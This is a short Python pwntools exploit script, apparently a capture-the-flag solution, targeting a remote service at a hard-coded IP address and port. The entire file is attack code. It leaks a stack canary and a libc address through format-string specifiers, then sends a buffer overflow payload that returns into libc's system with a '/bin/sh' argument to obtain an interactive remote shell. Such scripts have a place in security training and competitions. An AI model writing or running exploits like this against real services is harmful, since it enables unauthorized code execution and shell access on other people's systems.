#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.28"
#port = 8888
host = "54.169.184.122"
port = 2307


r = remote(host,port)

r.recvuntil('reddits:')

r.sendline("%140$08x")

data = r.recvuntil('except that')

m = re.match(r'.*\n([\d+a-f]{8})\nreddit has everything', data, re.DOTALL)

assert m

canary = m.group(1).decode('hex')[::-1]

r.sendline("%14$p")
data = r.recvuntil('except that')
libc = int(data.split()[0],16) - 0x132e5
print "libc:",hex(libc)

r.sendline('netsec')
r.recvuntil('subreddit:')

system = libc + 0x3ad80
sh = libc + 0x15ba3f
payload = ''
payload += 'a' * 16
payload += p32(0xdeadbeef)
payload += 'cccc'
payload += canary
payload += 'a' * 8 + p32(system) + p32(0) + p32(sh)

r.send(payload)

r.interactive()
